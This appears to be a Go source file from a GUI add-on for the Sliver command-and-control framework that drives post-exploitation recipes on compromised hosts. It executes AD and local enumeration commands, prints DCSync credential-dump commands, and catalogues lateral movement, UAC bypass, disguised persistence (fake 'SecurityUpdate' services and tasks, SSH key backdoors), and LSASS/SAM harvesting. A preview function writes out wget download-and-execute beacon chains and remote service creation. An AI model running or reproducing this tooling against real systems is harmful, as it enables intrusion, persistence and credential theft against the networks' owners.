// NOTE: This is an INSTRUCTIONAL STUB — it does not perform the actual DCSync.
// The operator must run mimikatz or impacket-secretsdump manually.
func (a *App) ScriptDCSync(sessionID string) ScriptResult {
	a.audit.log("script-dcsync", sessionID, "")
	ps := `powershell -c "echo '[!] DCSync — INSTRUCTIONAL ONLY (requires mimikatz or impacket)'; echo ''; echo 'Option 1 — From Kali (impacket):'; echo '  impacket-secretsdump DOMAIN/user:pass@DC_IP'; echo ''; echo 'Option 2 — On target (mimikatz via Sliver extension):'; echo '  ext mimikatz lsadump::dcsync /domain:DOMAIN /user:krbtgt'; echo ''; echo 'Option 3 — Upload mimikatz manually and run from this session.'"`
	output, ferr := a.executeShellCmd(sessionID, ps)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	lootMsg := a.saveHarvestToLoot(sessionID, "dcsync", output)
	return ScriptResult{Success: true, Output: output + lootMsg}
}

// ─── Windows/AD Enumeration ───────────────────────────────────────────────────

// ScriptADEnum enumerates Active Directory objects.
func (a *App) ScriptADEnum(sessionID string) ScriptResult {
	a.audit.log("script-ad-enum", sessionID, "")
	checks := []string{
		`echo === Domain Info === & echo %USERDOMAIN% / %USERDNSDOMAIN% & echo LogonServer: %LOGONSERVER%`,
		`echo === Domain Admins === & net group "Domain Admins" /domain 2>nul`,
		`echo === Domain Users === & net user /domain 2>nul`,
		`echo === Domain Computers === & net group "Domain Computers" /domain 2>nul`,
		`echo === Trust Relationships === & nltest /domain_trusts 2>nul`,
		`echo === GPO List === & gpresult /r 2>nul`,
		`echo === SPNs (Kerberoastable) === & setspn -T * -Q */* 2>nul`,
	}
	cmd := strings.Join(checks, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ScriptWinLocalEnum does local Windows enumeration.
func (a *App) ScriptWinLocalEnum(sessionID string) ScriptResult {
	a.audit.log("script-win-local-enum", sessionID, "")
	checks := []string{
		`echo === System Info === & systeminfo | findstr /i "OS Name\|OS Version\|System Type\|Domain"`,
		`echo === Current User === & whoami /all`,
		`echo === Local Admins === & net localgroup Administrators`,
		`echo === Network === & ipconfig /all | findstr /i "IPv4\|Subnet\|Gateway\|DNS"`,
		`echo === Connections === & netstat -ano | findstr ESTABLISHED`,
		`echo === Running Services === & net start`,
		`echo === AV/EDR === & wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState 2>nul`,
		`echo === Firewall === & netsh advfirewall show allprofiles state`,
	}
	cmd := strings.Join(checks, " & ")
	output, ferr := a.executeShellCmd(sessionID, cmd)
	if ferr != nil {
		return ScriptResult{Error: ferr.Error(), Output: output}
	}
	return ScriptResult{Success: true, Output: output}
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

// requireSession verifies the ID is a live interactive session and returns it.
// Script recipes drive the agent through immediate RPCs (Execute, Impersonate,
// …) which only work on sessions; a beacon queues tasks with delayed output and
// would look hung. Returning a clear error here beats a cryptic RPC failure.
func (a *App) requireSession(sessionID string) (*clientpb.Session, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	sessions, err := client.ListSessions(a.ctx)
	if err != nil {
		return nil, err
	}
	for _, s := range sessions {
		if s.ID == sessionID {
			return s, nil
		}
	}
	short := sessionID
	if len(short) > 8 {
		short = short[:8]
	}
	return nil, fmt.Errorf("agent %s is not an interactive session — Script Manager recipes need a session (a beacon queues tasks with delayed output). Interact via a session, or task the beacon from its own console", short)
}

// executeShellCmd runs a shell command on the agent and returns its combined
// output plus a real error. A non-nil error means the command did not execute
// (no client, not a session, RPC failure) — callers must surface that instead of
// reporting a misleading Success. In-band output (stdout+stderr) is returned
// even on success so recipes can show what happened.
func (a *App) executeShellCmd(sessionID, cmd string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	// Resolve the session once (also rejects beacons) and pick the right shell —
	// Windows scripts need cmd.exe, Linux/macOS need /bin/sh.
	sess, err := a.requireSession(sessionID)
	if err != nil {
		return "", err
	}
	exePath := "/bin/sh"
	args := []string{"-c", cmd}
	if strings.Contains(strings.ToLower(sess.OS), "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", cmd}
	}
	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	out := string(resp.Stdout)
	if len(resp.Stderr) > 0 {
		if out != "" {
			out += "\n"
		}
		out += string(resp.Stderr)
	}
	return out, nil
}

// getPivotInternalIP returns the pivot session's private LAN IPv4 — the host the
// target will wget the beacon from. It returns an error (rather than guessing a
// hardcoded address) when no private IP can be found, so the SSH-deploy chain
// fails loudly instead of silently pointing the target at the wrong host.
func (a *App) getPivotInternalIP(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.Ifconfig(a.ctx, &sliverpb.IfconfigReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", fmt.Errorf("ifconfig on pivot failed: %v", err)
	}
	for _, iface := range resp.NetInterfaces {
		for _, addr := range iface.IPAddresses {
			ipStr := strings.Split(addr, "/")[0]
			ip := net.ParseIP(ipStr)
			if ip == nil || ip.To4() == nil {
				continue // skip IPv6 / unparseable
			}
			if ip.IsLoopback() || ip.IsLinkLocalUnicast() {
				continue
			}
			if ip.IsPrivate() { // 10/8, 172.16/12, 192.168/16
				return ipStr, nil
			}
		}
	}
	return "", fmt.Errorf("no private LAN IPv4 found on the pivot session — specify the pivot IP manually")
}

func filepath_Base(path string) string {
	path = strings.ReplaceAll(path, "\\", "/")
	parts := strings.Split(path, "/")
	if len(parts) > 0 && parts[len(parts)-1] != "" {
		return parts[len(parts)-1]
	}
	return path
}

func readLocalFile(path string) ([]byte, error) {
	return os.ReadFile(path)
}

// targetFileExists reports whether winPath exists on the (Windows) session. Used
// by recipes that launch a pre-staged beacon so they fail with a clear message
// instead of silently doing nothing when no implant was staged.
// Uses powershell.exe -EncodedCommand Test-Path to avoid cmd.exe CLIXML/progress-
// stream noise that was swamping the __EXISTS__ marker in the old implementation.
func (a *App) targetFileExists(sessionID, winPath string) bool {
	psScript := fmt.Sprintf(
		`if (Test-Path -LiteralPath '%s') { Write-Host '__EXISTS__' } else { Write-Host '__MISSING__' }`,
		strings.ReplaceAll(winPath, "'", "''"),
	)
	var utf16 []byte
	for _, r := range psScript {
		utf16 = append(utf16, byte(r), byte(r>>8))
	}
	enc := base64.StdEncoding.EncodeToString(utf16)
	psCmd := fmt.Sprintf("powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand %s", enc)
	out, err := a.executeShellCmd(sessionID, psCmd)
	if err != nil {
		// Fallback: plain cmd.exe check
		out2, err2 := a.executeShellCmd(sessionID, fmt.Sprintf(`if exist "%s" (echo __EXISTS__) else (echo __MISSING__)`, winPath))
		if err2 != nil {
			return false
		}
		return strings.Contains(out2, "__EXISTS__")
	}
	return strings.Contains(out, "__EXISTS__")
}

// snapshotAgentIDs returns the set of current session+beacon IDs, used to detect
// a newly checked-in agent after a spawn.
func (a *App) snapshotAgentIDs() map[string]bool {
	ids := map[string]bool{}
	client, err := a.requireClient()
	if err != nil {
		return ids
	}
	if ss, e := client.RPC.GetSessions(a.ctx, &commonpb.Empty{}); e == nil {
		for _, s := range ss.Sessions {
			ids[s.ID] = true
		}
	}
	if bb, e := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{}); e == nil {
		for _, b := range bb.Beacons {
			ids[b.ID] = true
		}
	}
	return ids
}

// waitForNewAgent polls sessions+beacons up to timeout for an agent whose ID is
// not in 'before', returning a short human description if one appears (empty if
// none checks in — e.g. a beacon whose interval hasn't elapsed yet).
func (a *App) waitForNewAgent(before map[string]bool, timeout time.Duration) string {
	client, err := a.requireClient()
	if err != nil {
		return ""
	}
	deadline := time.Now().Add(timeout)
	for {
		if ss, e := client.RPC.GetSessions(a.ctx, &commonpb.Empty{}); e == nil {
			for _, s := range ss.Sessions {
				if !before[s.ID] {
					return fmt.Sprintf("session %.8s on %s (%s)", s.ID, s.Hostname, s.Username)
				}
			}
		}
		if bb, e := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{}); e == nil {
			for _, b := range bb.Beacons {
				if !before[b.ID] {
					return fmt.Sprintf("beacon %.8s on %s (%s)", b.ID, b.Hostname, b.Username)
				}
			}
		}
		if time.Now().After(deadline) {
			return ""
		}
		time.Sleep(1 * time.Second)
	}
}

// pivotHTTPPort picks a pseudo-random high port for the pivot's temporary HTTP
// server. A hardcoded port collides across repeated runs and is trivially
// signatured; a fresh port each time avoids both.
func pivotHTTPPort() int {
	return 20000 + int(time.Now().UnixNano()%40000)
}

// pivotServeCmd builds a background HTTP server command for /tmp on the pivot,
// trying python3 → python → python2 → busybox so it works regardless of what
// interpreter the host ships (not every box has python3).
func pivotServeCmd(port int) string {
	return fmt.Sprintf(
		"cd /tmp && { python3 -m http.server %d || python -m http.server %d || python2 -m SimpleHTTPServer %d || busybox httpd -f -p %d ; } >/dev/null 2>&1 &",
		port, port, port, port)
}

func (a *App) saveHarvestToLoot(sessionID, scriptName, output string) string {
	if strings.TrimSpace(output) == "" {
		return ""
	}
	client, err := a.requireClient()
	if err != nil {
		return ""
	}
	shortID := sessionID
	if len(shortID) > 8 {
		shortID = shortID[:8]
	}
	lootName := fmt.Sprintf("harvest-%s-%s-%d.txt", scriptName, shortID, time.Now().Unix())
	_, err = client.RPC.LootAdd(a.ctx, &clientpb.Loot{
		Name: lootName,
		File: &commonpb.File{
			Name: lootName,
			Data: []byte(output),
		},
	})
	if err != nil {
		return fmt.Sprintf("\n[!] Failed to save harvest to Loot: %v", err)
	}
	return fmt.Sprintf("\n[+] Harvest output saved to Teamserver Loot as '%s'", lootName)
}

// ─── List available scripts (for the panel) ──────────────────────────────────

type ScriptParam struct {
	Name        string   `json:"name"`
	Label       string   `json:"label"`
	Type        string   `json:"type"` // "text", "number", "password", "select"
	Required    bool     `json:"required"`
	Default     string   `json:"default"`
	Options     []string `json:"options,omitempty"`
	Placeholder string   `json:"placeholder"`
}

type ScriptInfo struct {
	Name        string        `json:"name"`
	Category    string        `json:"category"`
	Description string        `json:"description"`
	Method      string        `json:"method"`
	AttckID     string        `json:"attck"`
	OpsecNoise  string        `json:"opsec"`
	TargetOS    string        `json:"targetOS"` // "windows", "linux", "all"
	Params      []ScriptParam `json:"params"`
}

func (a *App) ListScripts() []ScriptInfo {
	return []ScriptInfo{
		// Lateral Movement — Linux
		{
			Name: "Spawn Local", Category: "Spawn (Current Host)", Description: "Generate + run new beacon on THIS machine (like CS spawn x64 http)", Method: "ScriptSpawnLocal",
			AttckID: "T1055", OpsecNoise: "Low", TargetOS: "all",
			Params: []ScriptParam{
				{Name: "targetOS", Label: "Target OS", Type: "select", Options: []string{"windows", "linux", "darwin"}, Default: "windows"},
				{Name: "arch", Label: "Architecture", Type: "select", Options: []string{"amd64", "386", "arm64"}, Default: "amd64"},
				{Name: "profileName", Label: "Profile Name", Type: "text", Required: true, Placeholder: "e.g. my-http-profile"},
			},
		},
		{
			Name: "SSH Deploy", Category: "Lateral Movement (Linux)", Description: "Deploy beacon on remote host via SSH from pivot", Method: "ScriptSSHDeploy",
			AttckID: "T1021.004", OpsecNoise: "Low", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "targetPort", Label: "Target Port", Type: "number", Default: "22"},
				{Name: "user", Label: "SSH Username", Type: "text", Default: "root"},
				{Name: "pass", Label: "SSH Password", Type: "password", Placeholder: "password"},
				{Name: "beaconPath", Label: "Beacon Path (on Pivot)", Type: "text", Required: true, Placeholder: "/tmp/pivot-beacon"},
			},
		},
		{
			Name: "Spawn Linux", Category: "Lateral Movement (Linux)", Description: "AUTO-GENERATE + deploy beacon via SSH (like CS jump ssh)", Method: "ScriptSpawnLinux",
			AttckID: "T1021.004", OpsecNoise: "Medium", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "targetPort", Label: "Target Port", Type: "number", Default: "22"},
				{Name: "user", Label: "SSH Username", Type: "text", Default: "root"},
				{Name: "pass", Label: "SSH Password", Type: "password", Placeholder: "password"},
				{Name: "listenerURL", Label: "Listener C2 URL", Type: "text", Required: true, Placeholder: "mtls://10.10.10.1:8443"},
			},
		},
		{
			Name: "SSH Execute", Category: "Lateral Movement (Linux)", Description: "Run a single command on target via SSH", Method: "ScriptSSHExecSimple",
			AttckID: "T1021.004", OpsecNoise: "Low", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "targetPort", Label: "Target Port", Type: "number", Default: "22"},
				{Name: "user", Label: "SSH Username", Type: "text", Default: "root"},
				{Name: "pass", Label: "SSH Password", Type: "password", Placeholder: "password"},
				{Name: "command", Label: "Command", Type: "text", Default: "id", Placeholder: "Command to run"},
			},
		},
		{
			Name: "SSH Check", Category: "Lateral Movement (Linux)", Description: "Verify SSH connectivity to target", Method: "ScriptSSHCheck",
			AttckID: "T1021.004", OpsecNoise: "Low", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "targetPort", Label: "Target Port", Type: "number", Default: "22"},
				{Name: "user", Label: "SSH Username", Type: "text", Default: "root"},
				{Name: "pass", Label: "SSH Password", Type: "password", Placeholder: "password"},
			},
		},

		// Lateral Movement — Windows
		{
			Name: "Spawn Windows", Category: "Lateral Movement (Windows)", Description: "AUTO-GENERATE + deploy via PsExec (like CS jump psexec64)", Method: "ScriptSpawnWindows",
			AttckID: "T1021.002", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "listenerURL", Label: "Listener C2 URL", Type: "text", Required: true, Placeholder: "mtls://10.10.10.1:8443"},
			},
		},
		{
			Name: "PsExec", Category: "Lateral Movement (Windows)", Description: "Deploy existing beacon via service creation", Method: "ScriptPsExec",
			AttckID: "T1543.003", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "beaconPath", Label: "Beacon Path (on Pivot)", Type: "text", Required: true, Placeholder: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "WMI Exec", Category: "Lateral Movement (Windows)", Description: "Execute command via WMI on remote host", Method: "ScriptWMIExec",
			AttckID: "T1047", OpsecNoise: "Medium", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "command", Label: "Command", Type: "text", Default: "whoami"},
			},
		},
		{
			Name: "WinRM Exec", Category: "Lateral Movement (Windows)", Description: "Execute command via WinRM/PSRemoting", Method: "ScriptWinRMExec",
			AttckID: "T1021.006", OpsecNoise: "Low", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "command", Label: "Command", Type: "text", Default: "whoami; hostname"},
			},
		},
		{
			Name: "SC Deploy", Category: "Lateral Movement (Windows)", Description: "Create and start remote service with beacon", Method: "ScriptSCDeploy",
			AttckID: "T1543.003", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "beaconPath", Label: "Beacon Path", Type: "text", Required: true, Placeholder: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "SMB Upload+Exec", Category: "Lateral Movement (Windows)", Description: "Upload beacon via SMB then execute", Method: "ScriptSMBUploadExec",
			AttckID: "T1021.002", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetHost", Label: "Target Host", Type: "text", Required: true, Placeholder: "192.168.50.20"},
				{Name: "user", Label: "Admin Username", Type: "text", Default: "Administrator"},
				{Name: "pass", Label: "Admin Password", Type: "password", Required: true},
				{Name: "beaconPath", Label: "Beacon Path", Type: "text", Required: true, Placeholder: `C:\Windows\Temp\update.exe`},
			},
		},

		// Privilege Escalation — Linux
		{
			Name: "Privesc Check (Linux)", Category: "Privilege Escalation", Description: "Enumerate sudo, SUID, writable dirs", Method: "ScriptPrivescCheck",
			AttckID: "T1082", OpsecNoise: "Low", TargetOS: "linux",
			Params: nil,
		},
		{
			Name: "Sudo Exploit", Category: "Privilege Escalation", Description: "Exploit sudo misconfiguration (find/vim/awk)", Method: "ScriptSudoExploit",
			AttckID: "T1548.003", OpsecNoise: "High", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "method", Label: "Exploit Binary Method", Type: "select", Options: []string{"find", "vim", "awk"}, Default: "find"},
			},
		},

		// Privilege Escalation — Windows
		{
			Name: "Privesc Check (Windows)", Category: "Privilege Escalation", Description: "Check AlwaysInstallElevated, unquoted paths, weak services", Method: "ScriptWinPrivescCheck",
			AttckID: "T1082", OpsecNoise: "Low", TargetOS: "windows",
			Params: nil,
		},
		{
			Name: "Token Impersonate", Category: "Privilege Escalation", Description: "List and impersonate available tokens", Method: "ScriptTokenImpersonate",
			AttckID: "T1134", OpsecNoise: "Medium", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "targetUser", Label: "Target Username (blank to list tokens)", Type: "text", Placeholder: "e.g. DOMAIN\\Administrator"},
			},
		},
		{
			Name: "GetSystem", Category: "Privilege Escalation", Description: "Escalate to SYSTEM via named pipe/service", Method: "ScriptGetSystem",
			AttckID: "T1134.001", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "profile", Label: "Saved Implant Profile Name", Type: "text", Required: true, Placeholder: "e.g. my-profile"},
			},
		},
		{
			Name: "UAC Bypass", Category: "Privilege Escalation", Description: "Bypass UAC via fodhelper/eventvwr (auto-stages current binary if blank)", Method: "ScriptUACBypass",
			AttckID: "T1548.002", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "beaconPath", Label: "Implant Executable Path (on target)", Type: "text", Default: `C:\Windows\Temp\svc.exe`, Placeholder: `C:\Windows\Temp\svc.exe`},
			},
		},

		// Persistence — Linux
		{
			Name: "Cron Persistence", Category: "Persistence (Linux)", Description: "Add cron job for beacon restart", Method: "ScriptPersistCron",
			AttckID: "T1053.003", OpsecNoise: "Medium", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "cronLine", Label: "Cron Entry Line", Type: "text", Default: "*/10 * * * * root /tmp/.svc"},
			},
		},
		{
			Name: "SSH Key Inject", Category: "Persistence (Linux)", Description: "Add SSH public key for backdoor access", Method: "ScriptPersistSSHKey",
			AttckID: "T1098.004", OpsecNoise: "Medium", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "pubKey", Label: "SSH Public Key", Type: "text", Required: true, Placeholder: "ssh-rsa AAAA..."},
				{Name: "targetUser", Label: "Target System User", Type: "text", Default: "root"},
			},
		},
		{
			Name: "Systemd Service", Category: "Persistence (Linux)", Description: "Create systemd service for persistence", Method: "ScriptPersistSystemd",
			AttckID: "T1543.002", OpsecNoise: "Medium", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "serviceName", Label: "Service Name", Type: "text", Default: "system-update"},
				{Name: "execPath", Label: "Executable Path", Type: "text", Default: "/tmp/.svc"},
			},
		},

		// Persistence — Windows
		{
			Name: "Registry Run Key", Category: "Persistence (Windows)", Description: "Add Run key for user-level persistence", Method: "ScriptPersistRegRun",
			AttckID: "T1547.001", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "name", Label: "Registry Value Name", Type: "text", Default: "SecurityUpdate"},
				{Name: "beaconPath", Label: "Target Binary Path", Type: "text", Default: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "Scheduled Task", Category: "Persistence (Windows)", Description: "Create scheduled task for SYSTEM persistence", Method: "ScriptPersistSchedTask",
			AttckID: "T1053.005", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "taskName", Label: "Task Name Path", Type: "text", Default: `\Microsoft\Windows\Maintenance\SecurityUpdate`},
				{Name: "beaconPath", Label: "Target Binary Path", Type: "text", Default: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "Service Install", Category: "Persistence (Windows)", Description: "Install beacon as a Windows service", Method: "ScriptPersistService",
			AttckID: "T1543.003", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "svcName", Label: "Service Name", Type: "text", Default: "WinUpdateSvc"},
				{Name: "beaconPath", Label: "Service Executable Path", Type: "text", Default: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "WMI Subscription", Category: "Persistence (Windows)", Description: "WMI event subscription persistence (stealthy)", Method: "ScriptPersistWMI",
			AttckID: "T1546.003", OpsecNoise: "Low", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "beaconPath", Label: "Payload Executable Path", Type: "text", Default: `C:\Windows\Temp\svc.exe`},
			},
		},
		{
			Name: "Startup Folder", Category: "Persistence (Windows)", Description: "Drop beacon in startup folder", Method: "ScriptPersistStartup",
			AttckID: "T1547.001", OpsecNoise: "High", TargetOS: "windows",
			Params: []ScriptParam{
				{Name: "beaconPath", Label: "Payload Executable Path", Type: "text", Default: `C:\Windows\Temp\svc.exe`},
			},
		},

		// Credential Harvesting
		{
			Name: "Harvest Creds (Linux)", Category: "Credentials", Description: "Search for passwords, keys, tokens on Linux", Method: "ScriptHarvestCreds",
			AttckID: "T1552", OpsecNoise: "Low", TargetOS: "linux", Params: nil,
		},
		{
			Name: "Harvest Creds (Windows)", Category: "Credentials", Description: "SAM dump, LSASS, cached creds, DPAPI", Method: "ScriptWinHarvestCreds",
			AttckID: "T1003", OpsecNoise: "High", TargetOS: "windows", Params: nil,
		},
		{
			Name: "Kerberoast", Category: "Credentials", Description: "Request TGS tickets for offline cracking", Method: "ScriptKerberoast",
			AttckID: "T1558.003", OpsecNoise: "Medium", TargetOS: "windows", Params: nil,
		},
		{
			Name: "DCSync", Category: "Credentials", Description: "Replicate AD hashes (requires DA)", Method: "ScriptDCSync",
			AttckID: "T1003.006", OpsecNoise: "High", TargetOS: "windows", Params: nil,
		},

		// Enumeration
		{
			Name: "Network Scan (Bash)", Category: "Enumeration", Description: "Port scan internal subnet from Linux implant", Method: "ScriptNetworkScan",
			AttckID: "T1046", OpsecNoise: "High", TargetOS: "linux",
			Params: []ScriptParam{
				{Name: "subnet", Label: "Subnet Prefix", Type: "text", Default: "192.168.50"},
				{Name: "ports", Label: "Space-separated Ports", Type: "text", Default: "22 80 443 445 3306 2375 3000 8080"},
			},
		},
		{
			Name: "AD Enumerate", Category: "Enumeration", Description: "Enumerate domain users, groups, SPNs", Method: "ScriptADEnum",
			AttckID: "T1069.002", OpsecNoise: "Low", TargetOS: "windows", Params: nil,
		},
		{
			Name: "Local Enum (Windows)", Category: "Enumeration", Description: "Whoami /all, net sessions, local admins", Method: "ScriptWinLocalEnum",
			AttckID: "T1082", OpsecNoise: "Low", TargetOS: "windows", Params: nil,
		},
	}
}

// ScriptPreview formats and returns the exact steps/commands for a recipe without executing them.
func (a *App) ScriptPreview(sessionID, method string, params map[string]string) ScriptResult {
	if params == nil {
		params = map[string]string{}
	}
	get := func(key, def string) string {
		if val, ok := params[key]; ok && val != "" {
			return val
		}
		return def
	}

	shortID := sessionID
	if len(shortID) > 8 {
		shortID = shortID[:8]
	}

	var sb strings.Builder
	fmt.Fprintf(&sb, "=== PREVIEW / DRY-RUN: %s ===\n", method)
	fmt.Fprintf(&sb, "[Pivot Session]: %s\n\n", shortID)

	switch method {
	case "ScriptSpawnLocal":
		osTarget := get("targetOS", "windows")
		arch := get("arch", "amd64")
		prof := get("profileName", "my-profile")
		remotePath := "/tmp/.spawn_123456"
		if osTarget == "windows" {
			remotePath = `C:\Windows\Temp\spawn_123456.exe`
		}
		sb.WriteString("Step 1: Check active listeners matching profile '" + prof + "'\n")
		sb.WriteString("Step 2: Generate beacon implant (OS: " + osTarget + ", Arch: " + arch + ", Profile: " + prof + ")\n")
		sb.WriteString("Step 3: Upload implant to pivot: " + remotePath + "\n")
		if osTarget != "windows" {
			sb.WriteString("Step 4: Chmod 0755 " + remotePath + "\n")
		}
		sb.WriteString("Step 5: Execute on pivot session: " + remotePath + "\n")
		sb.WriteString("Step 6: Poll sessions/beacons (12s) to confirm new agent check-in\n")

	case "ScriptSSHDeploy":
		host := get("targetHost", "192.168.50.20")
		port := get("targetPort", "22")
		user := get("user", "root")
		beacon := get("beaconPath", "/tmp/pivot-beacon")
		sb.WriteString("Step 1: Read local beacon file: " + beacon + "\n")
		sb.WriteString("Step 2: Upload to pivot session: /tmp/.deploy_XXXXX\n")
		sb.WriteString("Step 3: Chmod 0755 /tmp/.deploy_XXXXX\n")
		sb.WriteString("Step 4: Start background HTTP server on pivot: cd /tmp && python3 -m http.server <random_port> &\n")
		fmt.Fprintf(&sb, "Step 5: SSH to %s@%s:%s from pivot and execute:\n", user, host, port)
		sb.WriteString("  wget -q http://<pivot_lan_ip>:<random_port>/<beacon_file> -O /tmp/.deploy_YYYYY && chmod +x /tmp/.deploy_YYYYY && /tmp/.deploy_YYYYY &\n")

	case "ScriptSpawnLinux":
		host := get("targetHost", "192.168.50.20")
		port := get("targetPort", "22")
		user := get("user", "root")
		c2 := get("listenerURL", "mtls://10.10.10.1:8443")
		sb.WriteString("Step 1: Verify listener running for C2: " + c2 + "\n")
		sb.WriteString("Step 2: Generate fresh Linux amd64 beacon for C2: " + c2 + "\n")
		sb.WriteString("Step 3: Upload to pivot session: /tmp/.spawn_XXXXX\n")
		sb.WriteString("Step 4: Start background HTTP server on pivot: cd /tmp && python3 -m http.server <random_port> &\n")
		fmt.Fprintf(&sb, "Step 5: SSH to %s@%s:%s from pivot and execute:\n", user, host, port)
		sb.WriteString("  wget -q http://<pivot_lan_ip>:<random_port>/<implant_name> -O /tmp/.spawn_YYYYY && chmod +x /tmp/.spawn_YYYYY && /tmp/.spawn_YYYYY &\n")

	case "ScriptSSHExecSimple":
		host := get("targetHost", "192.168.50.20")
		port := get("targetPort", "22")
		user := get("user", "root")
		cmd := get("command", "id")
		fmt.Fprintf(&sb, "SSH to %s@%s:%s and execute command:\n  %s\n", user, host, port, cmd)

	case "ScriptSSHCheck":
		host := get("targetHost", "192.168.50.20")
		port := get("targetPort", "22")
		user := get("user", "root")
		fmt.Fprintf(&sb, "SSH to %s@%s:%s and execute test command:\n  id\n", user, host, port)

	case "ScriptSpawnWindows":
		host := get("targetHost", "192.168.50.20")
		user := get("user", "Administrator")
		c2 := get("listenerURL", "mtls://10.10.10.1:8443")
		sb.WriteString("Step 1: Verify listener running for C2: " + c2 + "\n")
		sb.WriteString("Step 2: Generate fresh Windows amd64 beacon for C2: " + c2 + "\n")
		sb.WriteString("Step 3: Upload to pivot session: C:\\Windows\\Temp\\spawn_XXXXX.exe\n")
		fmt.Fprintf(&sb, "Step 4: Execute on pivot to deploy via PsExec to %s:\n", host)
		fmt.Fprintf(&sb, "  net use \\\\%s\\C$ \"<password>\" /user:%s &\n", host, user)
		fmt.Fprintf(&sb, "  copy /Y \"C:\\Windows\\Temp\\spawn_XXXXX.exe\" \"\\\\%s\\C$\\Windows\\Temp\\spawn_XXXXX.exe\" &\n", host)
		fmt.Fprintf(&sb, "  sc \\\\%s create SvcXXXX binpath= \"C:\\Windows\\Temp\\spawn_XXXXX.exe\" start= demand &\n", host)
		fmt.Fprintf(&sb, "  sc \\\\%s start SvcXXXX\n", host)

	case "ScriptPsExec":
		host := get("targetHost", "192.168.50.20")
		user := get("user", "Administrator")
		beacon := get("beaconPath", `C:\Windows\Temp\svc.exe`)
		fmt.Fprintf(&sb, "Execute on pivot to deploy via PsExec to %s:\n", host)
		fmt.Fprintf(&sb, "  net use \\\\%s\\C$ /user:%s \"<password>\" &\n", host, user)
		fmt.Fprintf(&sb, "  copy /Y \"%s\" \\\\%s\\C$\\Windows\\Temp\\svc.exe &\n", beacon, host)
		fmt.Fprintf(&sb, "  sc \\\\%s create SliverSvc binpath= \"C:\\Windows\\Temp\\svc.exe\" start= auto &\n", host)
		fmt.Fprintf(&sb, "  sc \\\\%s start SliverSvc\n", host)

	case "ScriptWMIExec":
		host := get("targetHost", "192.168.50.20")
		user := get("user", "Administrator")
		cmd := get("command", "whoami")
		fmt.Fprintf(&sb, "Execute on pivot via WMI on %s:\n", host)
		fmt.Fprintf(&sb, "  wmic /node:\"%s\" /user:\"%s\" /password:\"<password>\" process call create \"%s\"\n", host, user, cmd)

	case "ScriptWinRMExec":
